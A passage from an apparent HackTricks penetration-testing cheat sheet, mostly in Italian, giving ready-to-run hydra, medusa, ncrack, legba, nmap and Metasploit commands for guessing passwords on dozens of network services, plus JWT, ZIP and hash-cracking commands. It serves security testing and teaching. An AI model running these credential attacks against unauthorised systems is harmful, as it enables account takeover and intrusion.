# Brute Force - CheatSheet

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare facilmente **automatizzare flussi di lavoro** supportati dagli strumenti della community più avanzati al mondo.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di github.

</details>

## Credenziali predefinite

**Cerca su Google** le credenziali predefinite della tecnologia che viene utilizzata, o **prova questi link**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Crea i tuoi Dizionari**

Trova il maggior numero possibile di informazioni sul target e genera un dizionario personalizzato. Strumenti che possono aiutare:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Genera password basate sulla tua conoscenza della vittima (nomi, date...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Uno strumento generatore di liste di parole, che ti consente di fornire un insieme di parole, offrendoti la possibilità di creare molteplici variazioni dalle parole fornite, creando una lista di parole unica e ideale da utilizzare per un determinato obiettivo.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Liste di parole

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare flussi di lavoro** con facilità, supportati dagli strumenti della comunità più avanzati al mondo.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Servizi

Ordinati in ordine alfabetico per nome del servizio.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

Il protocollo AJP (Apache JServ Protocol) è un protocollo di comunicazione che viene utilizzato tipicamente tra un server web e un server di applicazioni. AJP è spesso preso di mira durante attacchi di forza bruta per compromettere la sicurezza del server.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra

Cassandra è un database distribuito altamente scalabile che può essere soggetto a attacchi di forza bruta. Gli attaccanti possono tentare di indovinare le credenziali di accesso utilizzando combinazioni di nomi utente e password comuni o deboli. Per proteggere un'installazione di Cassandra da tali attacchi, è consigliabile implementare misure di sicurezza come l'uso di password complesse, la limitazione dei tentativi di accesso e l'implementazione di meccanismi di autenticazione multi-fattore.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

#### Brute Force

Brute force attacks against CouchDB are relatively simple to execute. The most common method is to use a tool like Hydra to repeatedly attempt to log in using different username and password combinations. This method can be effective if the credentials are weak or if the server is not properly configured to prevent multiple login attempts.

To protect against brute force attacks, it is recommended to use strong, unique passwords and implement account lockout policies that temporarily lock an account after a certain number of failed login attempts. Additionally, enabling IP whitelisting and implementing rate limiting can help mitigate the risk of brute force attacks.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Registro Docker
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

#### Brute Force

Brute force attacks involve trying all possible combinations of a password until the correct one is found. This can be an effective way to gain unauthorized access to an Elasticsearch instance if weak passwords are used. There are tools available that can automate the process of brute forcing passwords. It is important to use strong, complex passwords to protect against brute force attacks.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

### FTP
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### Brute Force Generico HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### Autenticazione di Base HTTP
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Invio modulo

In un attacco di forza bruta contro un modulo di invio HTTP POST, un attaccante invia automaticamente richieste POST con diverse combinazioni di dati per cercare di indovinare le credenziali di accesso o per sfruttare vulnerabilità nel sistema.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Per http**s** devi cambiare da "http-post-form" a "**https-post-form"**

### **HTTP - CMS --** (W)ordpress, (J)oomla o (D)rupal o (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

IMAP stands for Internet Message Access Protocol. It is a protocol used to retrieve emails from a mail server. IMAP brute force attacks involve trying different username and password combinations to gain unauthorized access to an email account. This can be done using tools like Hydra or Medusa.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

Internet Relay Chat (IRC) è un protocollo di comunicazione in tempo reale basato su testo utilizzato per la comunicazione su Internet. Gli attaccanti possono utilizzare tecniche di forza bruta per indovinare le password degli account IRC e ottenere accesso non autorizzato ai canali di chat.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

### ISCSI
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

Un JSON Web Token (JWT) è un metodo aperto standard (RFC 7519) che definisce un modo compatto e autonomo per trasmettere informazioni tra le parti come un oggetto JSON firmato. Queste informazioni possono essere verificate e fidate perché sono firmate digitalmente. I JWT possono essere firmati utilizzando un algoritmo segreto (HMAC) o un algoritmo pubblico/privato utilizzando RSA.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Lightweight Directory Access Protocol) è un protocollo standard per l'accesso a servizi di directory.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

#### Brute Force

Brute force attacks against MQTT brokers involve attempting to guess valid credentials by systematically trying all possible combinations of usernames and passwords. This can be achieved using tools like Hydra or custom scripts.

#### Prevention

To prevent brute force attacks against MQTT brokers, it is recommended to:
- Use strong and unique passwords
- Implement account lockout policies
- Limit the number of login attempts
- Monitor and log login attempts for suspicious activities
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

MSSQL è spesso soggetto a attacchi di forza bruta. Gli attaccanti possono utilizzare strumenti come Hydra, Metasploit o Nmap per eseguire attacchi di forza bruta contro i server MSSQL. È importante implementare misure di sicurezza come l'uso di password complesse e la limitazione dei tentativi di accesso per proteggere i server MSSQL da tali attacchi.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

MySQL è un sistema di gestione di database relazionali open source ampiamente utilizzato. È possibile eseguire attacchi di forza bruta per tentare di indovinare le credenziali di accesso al database MySQL. Questo può essere fatto utilizzando strumenti come Hydra, Metasploit o manualmente con uno script personalizzato.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

#### Brute Force

Brute force attacks are a common method used to gain unauthorized access to OracleSQL databases. Attackers use automated tools to systematically try all possible combinations of usernames and passwords until the correct one is found. This method is time-consuming but can be effective if the credentials are weak.

#### Prevention

To prevent brute force attacks, it is essential to use strong and complex passwords that are not easily guessable. Additionally, implementing account lockout policies after a certain number of failed login attempts can help mitigate the risk of unauthorized access. Regularly monitoring and reviewing access logs can also help detect and prevent brute force attacks.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
Per utilizzare **oracle\_login** con **patator** è necessario **installare**:
```bash
pip3 install cx_Oracle --upgrade
```
[Forza bruta hash OracleSQL offline](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versioni 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** e **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

PostgreSQL è un sistema di gestione di database relazionali (RDBMS) open source ampiamente utilizzato. È possibile eseguire attacchi di forza bruta contro i database PostgreSQL per tentare di indovinare le credenziali di accesso. Questo può essere fatto utilizzando strumenti come Hydra, Metasploit o manualmente con script personalizzati. È importante implementare misure di sicurezza robuste, come l'uso di password complesse e la limitazione dei tentativi di accesso per proteggere i database PostgreSQL da tali attacchi.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

Puoi scaricare il pacchetto `.deb` da installare da [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP (Remote Desktop Protocol) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. RDP is commonly used for remote administration and accessing virtual desktops. 

#### Brute Force Attack

A brute force attack against an RDP server involves trying all possible username and password combinations until the correct one is found. This can be achieved using automated tools that systematically generate and test different combinations. Brute force attacks can be time-consuming but are often successful if weak credentials are used. 

#### Mitigation

To protect against brute force attacks on RDP servers, it is recommended to:
- Use complex and unique passwords
- Implement account lockout policies
- Use multi-factor authentication
- Limit the number of login attempts
- Monitor and log login attempts for suspicious activity
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

Rexec è un protocollo di rete che consente a un utente di eseguire comandi su un sistema remoto. Un attaccante potrebbe utilizzare un attacco di forza bruta per indovinare le credenziali di accesso e ottenere l'accesso non autorizzato al sistema remoto.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin è un protocollo di rete che consente a un utente di accedere a un altro host su una rete. Questo protocollo è vulnerabile agli attacchi di forza bruta, in cui un hacker tenta di indovinare la password dell'utente provando una serie di password diverse.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) is a simple remote shell client included in Unix operating systems. It can be used to execute commands on a remote system. Rsh is often targeted during brute-force attacks due to its lack of encryption and authentication mechanisms.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

Real Time Streaming Protocol (RTSP) è un protocollo di rete utilizzato per il controllo di flussi multimediali continui, come l'audio o il video. È possibile utilizzare tecniche di forza bruta per tentare di ottenere l'accesso non autorizzato a server RTSP.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

Il protocollo SMB (Server Message Block) è un protocollo di rete utilizzato principalmente per condividere file, stampanti, porte seriali e altre risorse tra i nodi di una rete.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

Il Simple Mail Transfer Protocol (SMTP) è un protocollo standard per l'invio di email su una rete.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

SOCKS stands for Socket Secure and is a protocol that routes network packets between a client and a server through a proxy server. It can be used for various purposes, including anonymity, circumventing network filters, and accessing restricted content. SOCKS operates at the transport layer of the OSI model and can be used for both TCP and UDP traffic.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

#### Brute Force

Brute force attacks against SQL Server typically involve trying to guess the username and password combinations to gain unauthorized access to the database. This can be done using automated tools that systematically try all possible combinations until the correct one is found. 

#### Prevention

To prevent brute force attacks against SQL Server, it is recommended to:
- Use strong and complex passwords that are difficult to guess.
- Implement account lockout policies to lock out users after a certain number of failed login attempts.
- Monitor and log login attempts to detect and respond to suspicious activity.
- Consider using multi-factor authentication to add an extra layer of security to the login process.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH (Secure Shell) è un protocollo crittografico che consente di stabilire connessioni sicure su una rete non sicura. Utilizzando tecniche di forza bruta, un attaccante potrebbe tentare di indovinare la password di accesso a un server SSH.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Chiavi SSH deboli / PRNG prevedibile di Debian

Alcuni sistemi presentano difetti noti nel seme casuale utilizzato per generare materiale crittografico. Ciò può risultare in uno spazio delle chiavi drasticamente ridotto che può essere forzato con strumenti come [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Set pre-generati di chiavi deboli sono disponibili anche come [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ e OpenMQ)

Il protocollo di testo STOMP è un protocollo di messaggistica ampiamente utilizzato che **consente una comunicazione e interazione senza soluzione di continuità con servizi di code di messaggi popolari** come RabbitMQ, ActiveMQ, HornetQ e OpenMQ. Fornisce un approccio standardizzato ed efficiente per lo scambio di messaggi e l'esecuzione di varie operazioni di messaggistica.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet è un protocollo di rete che consente di stabilire una connessione remota con un dispositivo tramite la rete. Questo protocollo è spesso utilizzato per l'amministrazione remota dei dispositivi di rete.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

VNC (Virtual Network Computing) is a graphical desktop sharing system that allows you to remotely control another computer. It is commonly used for technical support and remote administration.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm (Windows Remote Management) è un protocollo di gestione remota sviluppato da Microsoft che consente la comunicazione tra computer su una rete. È possibile utilizzare attacchi di forza bruta per indovinare le credenziali di accesso e ottenere l'accesso non autorizzato a sistemi Windows vulnerabili.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare facilmente e **automatizzare flussi di lavoro** supportati dagli strumenti della community più avanzati al mondo.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Locale

### Database di cracking online

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 con/senza ESS/SSP e con qualsiasi valore di challenge)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash, catture WPA2 e archivi MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hash)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hash e hash di file)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hash)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hash)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Controlla questo prima di provare a eseguire un attacco di forza bruta su un hash.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Attacco zip con testo in chiaro conosciuto

È necessario conoscere il **testo in chiaro** (o parte del testo in chiaro) **di un file contenuto all'interno** dello zip crittografato. È possibile verificare **i nomi dei file e le dimensioni dei file contenuti all'interno** di uno zip crittografato eseguendo: **`7z l encrypted.zip`**\
Scarica [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) dalla pagina dei rilasci.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
